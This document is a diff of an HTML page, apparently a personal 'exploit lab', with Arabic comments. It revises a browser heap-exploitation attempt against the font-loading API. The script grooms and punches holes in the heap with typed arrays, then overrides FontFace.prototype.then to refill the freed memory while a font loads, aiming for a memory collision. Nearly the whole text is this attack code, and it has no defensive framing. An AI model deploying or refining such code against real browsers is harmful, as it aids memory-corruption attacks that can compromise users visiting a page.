@@ -1,63 +1,59 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Exploit Lab - Font Collision</title>
+    <style>
+        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        #status { font-size: 20px; font-weight: bold; }
+    </style>
+</head>
 <body>
-    <div id="status">Waiting for trigger...</div>
-    <script>
-        // 1. إعادة استخدام Grooming (تصفيف الذاكرة)
-        let fillers = [];
-        for (let i = 0; i < 500; i++) fillers.push(new Uint8Array(0x1000));
-        for (let i = 0; i < 500; i += 2) fillers[i] = null;
+    <h3>Targeted Font Exploit</h3>
+    <div id="status">Initializing...</div>
 
-        // 2. تفعيل الثغرة
-                function triggerTargetedExploit() {
+    <script>
+        // 1. إعداد مساحة الذاكرة (Heap Grooming)
+        let fillers = [];
+        for (let i = 0; i < 500; i++) {
+            fillers.push(new Uint8Array(0x1000));
+        }
+        // إحداث ثقوب للـ Collision
+        for (let i = 0; i < 500; i += 2) {
+            fillers[i] = null; 
+        }
+
+        function triggerTargetedExploit() {
             document.getElementById('status').innerHTML = "Triggering...";
             
-            // 1. تعريف الـ Font
+            // 2. تعريف الـ Font المصاب
             let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
             document.fonts.add(font);
 
-            // 2. تفعيل الـ Hook بقوة أكبر
+            // 3. تفعيل الـ Hook لإحداث التصادم
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    // إجبار الذاكرة على الاستجابة فوراً
                     document.getElementById('status').innerHTML = "Collision Attempted!";
                     
-                    // تحرير الذاكرة وتعبئتها فوراً (Heap Spray)
+                    // محاولة تسميم الذاكرة فوراً بملء الثقوب
                     for (let i = 0; i < 500; i++) {
-                        fillers[i] = new Uint32Array(32); 
+                        if (fillers[i] === null) {
+                            fillers[i] = new Uint32Array(32); 
+                        }
                     }
-                    
                     return undefined;
                 }
             });
 
-            // 3. التحميل مع "إجبار" الـ Promise على العمل
+            // 4. إطلاق التحميل
             document.fonts.load('1em ExploitFont', 'A').then(() => {
-                document.getElementById('status').innerHTML = "Load Finished (No Crash)";
+                document.getElementById('status').innerHTML = "Load Finished";
+            }).catch((e) => {
+                document.getElementById('status').innerHTML = "Error: " + e;
             });
         }
 
-            
-            let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-            document.fonts.add(font);
-
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    // هنا التوقيت الحساس: نحذف ونترك الـ FontFace يقع في الثقب
-                    setTimeout(() => {
-                        // محاولة إحداث التداخل هنا
-                        document.body.offsetTop; 
-                    }, 0);
-                    return undefined;
-                }
-            });
-
-            document.fonts.load('1em ExploitFont', 'A');
-        }
-
-        // انتظر ثانية واحدة ثم ابدأ
+        // بدء التنفيذ بعد ثانية
         setTimeout(triggerTargetedExploit, 1000);
     </script>
 </body>
